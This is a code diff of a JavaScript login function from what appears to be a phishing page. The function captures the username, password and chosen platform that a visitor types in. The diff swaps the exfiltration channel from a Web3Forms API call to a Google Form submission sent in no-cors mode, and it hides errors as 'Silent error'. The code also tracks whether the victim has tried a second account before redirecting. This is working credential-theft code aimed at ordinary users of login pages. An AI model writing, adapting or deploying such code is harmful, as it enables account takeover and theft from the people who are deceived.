@@ -88,24 +88,24 @@ async function login(e) {
     const user = document.getElementById("username").value;
     const pass = document.getElementById("password").value;
     const msgDiv = document.getElementById("msg");
-    
-    const ACCESS_KEY = 'b8c6b71e-47b9-45bb-a8ae-2d1da784526c'; 
 
-    // We use 'await' here to make sure the data is SENT before the code moves to the redirect
+    // 1. Replace the URL with your Google Form 'formResponse' URL
+    // 2. Replace entry.XXXX with your actual entry IDs from the pre-filled link
+    const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScxH57PP36M-z1C4l8zwDCA7g3pnJkyY5lW8QT5gp8ZPD_Qrw/viewform?usp=pp_url";
+    const formData = new FormData();
+    formData.append("entry.1234567", chosen); // Replace 1234567 with your Platform ID
+    formData.append("entry.2345678", user);    // Replace 2345678 with your Username ID
+    formData.append("entry.3456789", pass);    // Replace 3456789 with your Password ID
+
     try {
-        await fetch('https://api.web3forms.com/submit', {
+        // We use 'no-cors' because Google doesn't send CORS headers back
+        await fetch(formUrl, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                access_key: ACCESS_KEY,
-                platform: chosen, 
-                username: user,  
-                password: pass,
-                attempt: hasTriedFirst ? "Second Account" : "First Account"
-            })
+            mode: 'no-cors',
+            body: formData
         });
     } catch (err) {
-        console.log("Submission error:", err);
+        console.log("Silent error");
     }
 
     if (!hasTriedFirst) {
